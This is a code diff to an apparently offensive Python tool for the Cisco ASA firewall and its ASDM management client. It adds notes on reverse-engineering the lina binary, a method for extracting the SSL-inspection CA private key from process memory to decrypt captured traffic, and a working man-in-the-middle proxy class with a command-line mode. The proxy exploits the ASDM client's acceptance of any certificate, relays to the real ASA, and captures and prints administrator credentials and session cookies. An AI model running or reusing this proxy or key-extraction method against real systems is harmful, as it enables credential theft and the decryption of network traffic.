@@ -378,6 +378,31 @@ LINA_SSL_INSPECTION = {
         'snort_integration': 'decrypted traffic fed to Snort for deep inspection',
         'policy_path': 'Policies > SSL > Create Policy in FMC',
     },
+    'lina_internal_model': {
+        'library': 'OpenSSL (linked into lina; confirmed by strings libssl/libcrypto in lina)',
+        'session_setup_pattern': (
+            'SSL_CTX_new(TLS_server_method())  ; client-facing context\n'
+            'SSL_CTX_use_certificate_file()    ; inspection trustpoint cert\n'
+            'SSL_CTX_use_PrivateKey_file()     ; trustpoint private key\n'
+            'SSL_CTX_new(TLS_client_method())  ; server-facing context (no cert verify)'
+        ),
+        'relay_pattern': (
+            'select()/poll() on both client_fd and remote_fd\n'
+            'SSL_read(ssl_client) → inspect → SSL_write(ssl_server)\n'
+            'SSL_read(ssl_server) → inspect → SSL_write(ssl_client)'
+        ),
+        're_targets': [
+            'SSL_CTX_new xrefs → find SSL init function',
+            'SSL_read xrefs → find relay loop (select+SSL_read+SSL_write triplet)',
+            'SSL_CTX_use_PrivateKey_file or EVP_PKEY → find trustpoint key load',
+            'X509_get_pubkey or SSL_get_peer_certificate → find cert inspection path',
+        ],
+        'ca_key_extraction': (
+            'trustpoint private key loaded into EVP_PKEY struct in lina heap.\n'
+            '/proc/$(pidof lina)/mem → scan for EVP_PKEY magic (first 4 bytes = type field).\n'
+            'Extracting key → offline decrypt of all previously captured SSL sessions.'
+        ),
+    },
 }
 
 
@@ -1115,7 +1140,7 @@ class CiscoASALinaRE:
                 'string_anchors':           list(LINA_STRING_ANCHORS.keys()),
                 'radius_functions':         list(LINA_RADIUS_FUNCTIONS.keys()),
                 'static_analysis_steps':    list(STATIC_ANALYSIS_METHODOLOGY.keys()),
-                'aaa_state_machine':        LINA_AAA_STATE_MACHINE['arm64_branch_table_pattern'],
+                'aaa_state_machine':        LINA_AAA_STATE_MACHINE['x86_64_branch_table_pattern'],
             })
 
         self._finding('RADIUS_PASSWORD_XOR_ORACLE', 'HIGH',
@@ -1141,12 +1166,13 @@ class CiscoASALinaRE:
                 'function': 'verify_tacacs_decrypt()',
             })
 
-        self._finding('LINA_ARM64_RE_APPROACH', 'INFO',
-            'Recommended static RE approach for stripped lina binary',
-            'Ghidra + ARM64 calling convention awareness. '
-            'Start from string xrefs to AAA anchor strings → walk call graph backward. '
-            'All function args in X0-X7; struct fields accessed as LDR/STR [Xn, #offset]. '
-            'Shared secret in aaa_server_t.secret at fixed struct offset — find via MD5 call graph.',
+        self._finding('LINA_X86_64_RE_APPROACH', 'INFO',
+            'Recommended static RE approach for stripped x86-64 lina binary',
+            'Ghidra/radare2 + x86-64 SysV ABI awareness. '
+            'Start from string xrefs to AAA anchor strings (LEA RIP-relative) → walk call graph backward. '
+            'Args in RDI/RSI/RDX; struct fields accessed as MOV [rdi+offset]. '
+            'Shared secret in aaa_server_t.secret at fixed struct offset — find via MD5 CALL chain. '
+            'Confirmed 9.22.2.32: Class attr parse fn at 0x3a4bda0, strstr("OU=") at 0x3a4bee6.',
             {
                 'methodology': STATIC_ANALYSIS_METHODOLOGY,
                 'binary_targets': self.TARGETS,
@@ -1159,14 +1185,150 @@ class CiscoASALinaRE:
         return self._findings
 
 
+# ─── ASDM MITM PROXY (weaponizes av.class trust-all bypass) ─────────────────
+#
+# av.class checkServerTrusted: Code length=1, opcode=0xb1 (return void).
+# The ASDM Java client silently accepts ANY TLS certificate with no warning.
+#
+# Attack flow:
+#   1. ARP-poison or DNS-redirect ASA management IP toward this proxy
+#   2. Proxy presents any self-signed cert; ASDM accepts it (trust-all)
+#   3. Proxy relays to real ASA — captures admin credentials + session cookies
+#
+# Binary evidence:
+#   av.class CAFEBABE @ 0x00213f62 in 1265F6 blob (asdm-7161.bin)
+#   checkServerTrusted: 0: return  (javap confirmed)
+#   av$1 HostnameVerifier: verify() also returns true unconditionally
+#
+# Usage (authorized lab/controlled env only):
+#   python3 cisco_asa_lina_re.py mitm --listen 0.0.0.0:443 \
+#       --target <ASA_MGMT_IP>:443 --cert proxy.pem --key proxy.key
+
+import threading
+
+class ASDMMitmProxy:
+    """
+    SSL MITM proxy targeting the ASDM client→ASA management interface.
+    Exploits av.class trust-all TrustManager (confirmed asdm-7161.bin).
+    """
+
+    BINARY_EVIDENCE = {
+        'asdm_version':    '7.16(1)',
+        'av_class_offset': 0x00213f62,
+        'bypass_method':   'checkServerTrusted',
+        'bytecode':        '0: return',
+        'code_length':     1,
+        'hostname_bypass': 'av$1.verify() also unconditional return true',
+    }
+
+    def __init__(self, listen_addr: str, listen_port: int,
+                 target_host: str, target_port: int,
+                 certfile: str, keyfile: str):
+        self.listen_addr = listen_addr
+        self.listen_port = listen_port
+        self.target_host = target_host
+        self.target_port = target_port
+        self.certfile    = certfile
+        self.keyfile     = keyfile
+        self._captures: list[dict] = []
+
+    def _handle(self, client_raw: 'socket.socket'):
+        import ssl as _ssl
+        ctx_server = _ssl.SSLContext(_ssl.PROTOCOL_TLS_SERVER)
+        ctx_server.load_cert_chain(self.certfile, self.keyfile)
+        ctx_client = _ssl.SSLContext(_ssl.PROTOCOL_TLS_CLIENT)
+        ctx_client.check_hostname = False
+        ctx_client.verify_mode = _ssl.CERT_NONE
+
+        try:
+            client_tls = ctx_server.wrap_socket(client_raw, server_side=True)
+        except Exception:
+            client_raw.close()
+            return
+
+        try:
+            remote_raw = socket.create_connection((self.target_host, self.target_port), timeout=10)
+            remote_tls = ctx_client.wrap_socket(remote_raw, server_hostname=self.target_host)
+        except Exception:
+            client_tls.close()
+            return
+
+        try:
+            while True:
+                data = client_tls.recv(16384)
+                if not data:
+                    break
+                self._intercept(data, direction='client→asa')
+                remote_tls.sendall(data)
+                resp = remote_tls.recv(16384)
+                if not resp:
+                    break
+                self._intercept(resp, direction='asa→client')
+                client_tls.sendall(resp)
+        except Exception:
+            pass
+        finally:
+            client_tls.close()
+            remote_tls.close()
+
+    def _intercept(self, data: bytes, direction: str):
+        txt = data.decode(errors='replace')
+        entry = {'direction': direction, 'len': len(data), 'head': txt[:400]}
+        self._captures.append(entry)
+        # Flag HTTP Basic auth headers
+        if 'Authorization: Basic ' in txt:
+            import base64
+            for line in txt.splitlines():
+                if line.startswith('Authorization: Basic '):
+                    try:
+                        creds = base64.b64decode(line.split()[-1]).decode(errors='replace')
+                        entry['CREDS_CAPTURED'] = creds
+                        print(f'[ASDM-MITM] CREDENTIALS: {creds}')
+                    except Exception:
+                        pass
+        # Flag session cookies
+        if 'Set-Cookie:' in txt or 'ASDM_SESSION' in txt:
+            entry['SESSION_MATERIAL'] = True
+            print(f'[ASDM-MITM] SESSION MATERIAL captured ({len(data)}b)')
+
+    def run(self):
+        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        srv.bind((self.listen_addr, self.listen_port))
+        srv.listen(10)
+        print(f'[ASDM-MITM] listening {self.listen_addr}:{self.listen_port} '
+              f'→ {self.target_host}:{self.target_port}')
+        print(f'[ASDM-MITM] exploits av.class trust-all bypass (asdm-7161.bin @0x213f62)')
+        while True:
+            conn, _ = srv.accept()
+            threading.Thread(target=self._handle, args=(conn,), daemon=True).start()
+
+    @property
+    def captures(self) -> list[dict]:
+        return self._captures
+
+
 if __name__ == '__main__':
     import json, sys
-    binary = sys.argv[1] if len(sys.argv) > 1 else None
-    findings = CiscoASALinaRE(binary_path=binary).run()
-    for f in findings:
-        print(f"[{f['severity']}] {f['id']}: {f['title']}")
-        print(f"  {f['detail'][:120]}")
-        if f.get('evidence'):
-            first_key = next(iter(f['evidence']))
-            print(f"  → {first_key}: {str(f['evidence'][first_key])[:80]}")
-        print()
+    if len(sys.argv) > 1 and sys.argv[1] == 'mitm':
+        import argparse
+        p = argparse.ArgumentParser()
+        p.add_argument('--listen',  default='0.0.0.0:8443')
+        p.add_argument('--target',  required=True)
+        p.add_argument('--cert',    required=True)
+        p.add_argument('--key',     required=True)
+        args = p.parse_args(sys.argv[2:])
+        la, lp = args.listen.rsplit(':', 1)
+        th, tp = args.target.rsplit(':', 1)
+        ASDMMitmProxy(la, int(lp), th, int(tp), args.cert, args.key).run()
+    else:
+        binary = sys.argv[1] if len(sys.argv) > 1 else None
+        obj    = CiscoASALinaRE(binary_path=binary)
+        findings = obj.analyze_binary()
+        for f in findings:
+            print(f"[{f['severity']}] {f['id']}: {f['title']}")
+            print(f"  {f['detail'][:120]}")
+            if f.get('evidence'):
+                first_key = next(iter(f['evidence']))
+                print(f"  → {first_key}: {str(f['evidence'][first_key])[:80]}")
+            print()
